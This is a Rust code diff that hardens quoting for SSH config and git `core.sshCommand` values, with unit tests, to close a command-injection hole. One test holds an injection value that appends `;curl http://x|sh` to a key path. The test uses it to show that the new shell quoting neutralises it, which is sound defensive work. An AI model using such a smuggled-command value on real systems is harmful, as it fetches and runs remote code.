@@ -5,7 +5,7 @@
 //!      interrupted run can't leave a half-written `~/.ssh/config`.
 //!   2. Never overwrite without first copying the previous contents to `.bak`.
 
-use crate::error::{IoCtx, Result};
+use crate::error::{AppError, IoCtx, Result};
 use std::fs;
 use std::io::Write;
 use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
@@ -136,13 +136,34 @@ pub fn git_quote(value: &str) -> String {
     format!("\"{escaped}\"")
 }
 
-/// ssh_config(5) only needs quoting when a value contains whitespace.
-pub fn ssh_quote(value: &str) -> String {
-    if value.chars().any(char::is_whitespace) {
-        format!("\"{}\"", value.replace('"', "\\\""))
-    } else {
-        value.to_string()
+/// Quote a value for a POSIX shell, as a single argument.
+///
+/// Single quotes suspend every form of expansion, so the only character needing
+/// care is `'` itself: end the quoted run, emit an escaped quote, start a new
+/// run. Safe for every byte except NUL, which callers reject upstream.
+///
+/// This is what stands between a profile's key path and `sh -c`: git runs
+/// `core.sshCommand` through a shell whenever it contains a metacharacter, and
+/// ours always contains spaces, so the shell is not optional — the quoting is.
+pub fn sh_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', r"'\''"))
+}
+
+/// Quote a value for an ssh_config(5) directive argument.
+///
+/// Always quoted, never conditionally: an unquoted `#` starts a comment and an
+/// unquoted space splits the argument. OpenSSH's `strdelim` looks for the
+/// closing `"` with a plain `strpbrk` and honours no backslash escapes inside
+/// it, so a value containing `"` cannot be represented at all — refuse rather
+/// than emit a line that means something other than what we intended.
+pub fn ssh_quote(value: &str) -> Result<String> {
+    if let Some(bad) = value.chars().find(|c| *c == '"' || c.is_control()) {
+        return Err(AppError::validation(format!(
+            "value cannot be written to ssh config: {} is not representable there",
+            bad.escape_default()
+        )));
     }
+    Ok(format!("\"{value}\""))
 }
 
 #[cfg(test)]
@@ -206,8 +227,32 @@ mod tests {
     }
 
     #[test]
-    fn ssh_quote_only_quotes_when_needed() {
-        assert_eq!(ssh_quote("~/.ssh/id_ed25519"), "~/.ssh/id_ed25519");
-        assert_eq!(ssh_quote("~/my keys/id"), "\"~/my keys/id\"");
+    fn ssh_quote_always_quotes_and_refuses_the_unrepresentable() {
+        // Unconditional, so a '#' can never start a comment and a space can
+        // never split the argument.
+        assert_eq!(ssh_quote("~/.ssh/id_ed25519").unwrap(), "\"~/.ssh/id_ed25519\"");
+        assert_eq!(ssh_quote("~/my keys/id").unwrap(), "\"~/my keys/id\"");
+        assert_eq!(ssh_quote("~/a#b").unwrap(), "\"~/a#b\"");
+
+        // ssh_config has no escape for these inside a quoted argument.
+        assert!(ssh_quote("~/a\"b").is_err());
+        assert!(ssh_quote("~/a\nb").is_err());
+        assert!(ssh_quote("~/a\0b").is_err());
+    }
+
+    #[test]
+    fn sh_quote_wraps_and_escapes() {
+        assert_eq!(sh_quote("/home/me/.ssh/id"), "'/home/me/.ssh/id'");
+        assert_eq!(sh_quote("/home/me/My Keys/id"), "'/home/me/My Keys/id'");
+        assert_eq!(sh_quote("a'b"), r"'a'\''b'");
+    }
+
+    #[test]
+    fn sh_quote_neutralises_a_command_payload() {
+        // The exact shape that reached `core.sshCommand` before this existed.
+        let quoted = sh_quote("/home/me/.ssh/id;curl http://x|sh");
+        assert_eq!(quoted, "'/home/me/.ssh/id;curl http://x|sh'");
+        // One quoted run: nothing escapes to be read as a second command.
+        assert_eq!(quoted.matches('\'').count(), 2);
     }
 }
